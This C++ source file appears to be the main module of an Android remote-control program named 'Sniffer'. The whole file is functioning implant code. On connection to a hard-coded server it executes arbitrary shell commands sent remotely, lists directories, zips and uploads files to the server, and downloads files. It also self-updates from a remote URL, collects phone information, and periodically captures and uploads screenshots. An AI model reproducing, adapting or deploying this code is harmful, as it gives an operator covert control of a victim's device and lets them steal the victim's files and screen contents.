/*
 * SnifferMain.cpp
 *
 *  Created on: 2015-11-14
 *      Author: Max
 */

#include "SnifferMain.h"

#include <common/KZip.h>
#include <sys/stat.h>

SnifferMain::SnifferMain() {
	// TODO Auto-generated constructor stub
	string website = "http://";
	website += ServerAdess;
	website += ":";
	char port[8];
	sprintf(port, "%d", HttpServerPort);
	website += port;
	website += "/";

	mHttpRequestHostManager.SetWebSite(website);
	mHttpRequestManager.SetHostManager(&mHttpRequestHostManager);
	mHttpRequestManager.SetVersionCode("Version", SnifferVersion);

	char deviceId[128] = {'\0'};
	memset(deviceId, '\0', sizeof(deviceId));
	list<IpAddressNetworkInfo> infoList = IPAddress::GetNetworkInfoList();
	if( infoList.size() > 0 && infoList.begin() != infoList.end() ) {
		IpAddressNetworkInfo info = *(infoList.begin());
		GetMD5String(info.mac.c_str(), deviceId);
	}

	mRequestScreenCapUpdateTask.SetParam(deviceId, website, UPLOAD_SERVER_FILE);
	mRequestScreenCapUpdateTask.SetCallback(this);
}

SnifferMain::~SnifferMain() {
	// TODO Auto-generated destructor stub
}

void SnifferMain::OnConnected(SnifferClient* client) {
	mRequestScreenCapUpdateTask.Start();
}

void SnifferMain::OnDisConnected(SnifferClient* client) {
	mRequestScreenCapUpdateTask.Stop();
}

void SnifferMain::OnRecvCmdExcuteCommand(SnifferClient* client, int seq, const string& cmd) {
	// 执行Shell命令
	string result = SystemComandExecuteWithResult(cmd);
	mSnifferClient.SendCmdExcuteCommand(true, seq, result);
}

void SnifferMain::OnRecvCmdSnifferListDir(SnifferClient* client, int seq, const string& dir, int index, int size) {
	// 列目录
	bool bFlag = false;
	list<FileStruct> itemList;

	DIR *dirp;
	dirent *dp;
	struct stat statbuf;
	int i = 0;
	char st_size[32];

	int iTotal = 0;

    if( (dirp = opendir(dir.c_str())) != NULL ) {
    	bFlag = true;

    	while( (dp = readdir(dirp)) != NULL ) {
    		FileStruct dirItem;
    		dirItem.type = dp->d_type;
    		dirItem.mode = GetFileMode(&statbuf);

			string absPath = dir + dp->d_name;
			stat(absPath.c_str(), &statbuf);
			sprintf(st_size, "%lld", statbuf.st_size);
			dirItem.st_size = st_size;
			dirItem.name = dp->d_name;

			if( dp->d_type == DT_DIR ) {
				if( strcmp(dp->d_name, ".") != 0 ) {
					if( iTotal >= index * size && iTotal < (index + 1) * size ) {
						itemList.push_back(dirItem);
					}

					iTotal++;
				}
			} else {
				if( iTotal >= index * size && iTotal < (index + 1) * size ) {
					itemList.push_back(dirItem);
				}

				iTotal++;
			}

    	 }

    	 closedir(dirp);
    }

    mSnifferClient.SendCmdSnifferListDir(true, seq, itemList, iTotal);
}

void SnifferMain::OnRecvCmdSnifferUploadFile(SnifferClient* client, int seq, const string& filePath) {
	// 上传文件到服务器
	char deviceId[128] = {'\0'};
	memset(deviceId, '\0', sizeof(deviceId));
	list<IpAddressNetworkInfo> infoList = IPAddress::GetNetworkInfoList();
	if( infoList.size() > 0 && infoList.begin() != infoList.end() ) {
		IpAddressNetworkInfo info = *(infoList.begin());
		GetMD5String(info.mac.c_str(), deviceId);
	}

	bool bDir = false;

	struct stat statbuf;
	string uploadFilePath = filePath;
	if( 0 == stat(filePath.c_str(), &statbuf) ) {
		if( S_ISDIR(statbuf.st_mode) ) {
			FileLog(SnifferLogFileName, "SnifferMain::OnRecvCmdSnifferUploadFile( 上传目录 )");

			// 打包
			KZip zip;
			uploadFilePath += ".zip";
			zip.CreateZipFromDir(filePath, uploadFilePath);
			bDir = true;
		} else {
			FileLog(SnifferLogFileName, "SnifferMain::OnRecvCmdSnifferUploadFile( 上传文件  )");
		}
	}

	RequestUploadTask* task = new RequestUploadTask();
	task->SetTaskCallback(this);
	task->SetCallback(this);
	task->Init(&mHttpRequestManager);
	task->SetSeq(seq);
	task->SetParam(deviceId, uploadFilePath, bDir);

	if( !task->Start() ) {
		mSnifferClient.SendCmdSnifferUploadFile(false, seq, "", "");
	}
}

void SnifferMain::OnRecvCmdSnifferDownloadFile(SnifferClient* client, int seq, const string& url, const string& filePath) {
	// 下载文件到客户端
	RequestDownloadTask* task = new RequestDownloadTask();
	task->SetTaskCallback(this);
	task->SetCallback(this);
	task->SetSeq(seq);
	task->SetParam(url, filePath);
	if( !task->Start() ) {
		mSnifferClient.SendCmdSnifferDownloadFile(false, seq, "");
	}
}

void SnifferMain::OnRecvCmdSnifferCheckUpdate(SnifferClient* client, int seq, const string& url, const string& version) {
	// 更新客户端
	bool bUpdate = version.compare(SnifferVersion) >= 0;
	if( bUpdate ) {
		string sniffer_update = SinfferFileUpdateDir;
		sniffer_update += SinfferFileUpdate;
		MakeDir(SinfferFileUpdateDir);

		// 生成路径
		string sniffer_url = url;
		sniffer_url += "/";
		sniffer_url += SinfferFile;

		RequestUpdateTask* task = new RequestUpdateTask();
		task->SetTaskCallback(this);
		task->SetCallback(this);
		task->SetSeq(seq);
		task->SetParam(sniffer_url, sniffer_update);
		if( !task->Start() ) {

		}
	}
}

bool SnifferMain::Run() {
	FileLog(SnifferLogFileName, "SnifferMain::Run()");

	bool bFlag = false;

	// 获取手机信息
	GetPhoneInfo();

	mSnifferClient.SetSnifferClientCallback(this);
	bFlag = mSnifferClient.Start();

	FileLog(SnifferLogFileName, "SnifferMain::Run( bFlag : %s )", bFlag?"true":"false");

	return bFlag;
}

void SnifferMain::OnTaskFinish(ITask* pTask) {
	FileLog(SnifferLogFileName, "SnifferMain::OnTaskFinish( pTask : %p )", pTask);
	delete pTask;
}

void SnifferMain::OnUpload(bool success, const string& filePath, RequestUploadTask* task) {
	FileLog(SnifferLogFileName,
			"SnifferMain::OnUpload( "
			"success : %s, "
			"filePath : %s, "
			"task : %p "
			")",
			success?"true":"false",
			filePath.c_str(),
			task
			);

	if( task->IsDir() ) {
		string cmd = "rm -r ";
		cmd += task->GetFilePath();
		SystemComandExecute(cmd.c_str());
	}

	string website = "http://";
	website += ServerAdess;
	website += ":";
	char port[8];
	sprintf(port, "%d", HttpServerPort);
	website += port;
	website += "/";

	mSnifferClient.SendCmdSnifferUploadFile(success, task->GetSeq(), website, filePath);
}

void SnifferMain::OnDownload(bool success, const string& filePath, RequestDownloadTask* task) {
	FileLog(SnifferLogFileName,
			"SnifferMain::OnDownload( "
			"success : %s, "
			"filePath : %s, "
			"task : %p "
			")",
			success?"true":"false",
			filePath.c_str(),
			task
			);

	mSnifferClient.SendCmdSnifferDownloadFile(success, task->GetSeq(), filePath);
}

void SnifferMain::OnUpdateFinish(bool success, const string& filePath, RequestUpdateTask* task) {
	FileLog(SnifferLogFileName,
			"SnifferMain::OnUpdateFinish( "
			"success : %s, "
			"filePath : %s, "
			"task : %p "
			")",
			success?"true":"false",
			filePath.c_str(),
			task
			);

	// 获取当前程序绝对路径
	char file[4096];
	int cnt = readlink("/proc/self/exe", file, 4096);
	if( cnt >= 0 ) {
		string dir = file;
		if( dir.length() > 1 ) {
			string::size_type pos = dir.find_last_of("/", dir.length() - 2);
			if( pos != string::npos ) {
				dir = dir.substr(0, pos + 1);
			}
		}

		FileLog(SnifferLogFileName,
				"SnifferMain::OnUpdateFinish( "
				"file : %s, "
				"dir : %s "
				")",
				file,
				dir.c_str()
				);

		if( UpdateSniffer(filePath, dir, "/sdcard/") ) {
			mSnifferClient.Stop();
			RemoveFile(filePath);
			exit(0);
		}
	}
}

string SnifferMain::GetFileMode(const struct stat* statbuf) {
	int st_mode = statbuf->st_mode;
	string m = "-";

	// onwer
	if( st_mode & S_IRUSR ) {
		m += "r";
	} else {
		m += "-";
	}

	if( st_mode & S_IWUSR ) {
		m += "w";
	} else {
		m += "-";
	}

	if( st_mode & S_IXUSR ) {
		m += "x";
	} else {
		m += "-";
	}

	// group
	if( st_mode & S_IRGRP ) {
		m += "r";
	} else {
		m += "-";
	}

	if( st_mode & S_IWGRP ) {
		m += "w";
	} else {
		m += "-";
	}

	if( st_mode & S_IXGRP ) {
		m += "x";
	} else {
		m += "-";
	}

	// other
	if( st_mode & S_IROTH ) {
		m += "r";
	} else {
		m += "-";
	}

	if( st_mode & S_IWOTH ) {
		m += "w";
	} else {
		m += "-";
	}

	if( st_mode & S_IXOTH ) {
		m += "x";
	} else {
		m += "-";
	}

	return m;
}

void SnifferMain::OnUploadScreenCap(bool success, const string& url, RequestScreenCapUpdateTask* task) {
	FileLog(SnifferLogFileName,
			"SnifferMain::OnUploadScreenCap( "
			"success : %s, "
			"url : %s, "
			"task : %p "
			")",
			success?"true":"false",
			url.c_str(),
			task
			);

	if( success ) {
		mSnifferClient.SendCmdSnifferScreenCapUpdate(url);
	}
}

bool SnifferMain::OnGetScreenCap(string& filePath, RequestScreenCapUpdateTask* task) {
	FileLog(SnifferLogFileName,
			"SnifferMain::OnGetScreenCap( "
			"task : %p "
			")",
			task
			);

	bool bFlag = false;

	filePath = "/sdcard/sniffer/screencap.png";
	string cmd = "screencap -p ";
	cmd += filePath;
	string result = SystemComandExecuteWithResult(cmd);
	if( result.length() == 0 ) {
		bFlag = true;
	}

	FileLog(SnifferLogFileName,
			"SnifferMain::OnGetScreenCap( "
			"bFlag : %s, "
			"filePath : %s, "
			"task : %p "
			")",
			bFlag?"true":"false",
			filePath.c_str(),
			task
			);

	return bFlag;
}
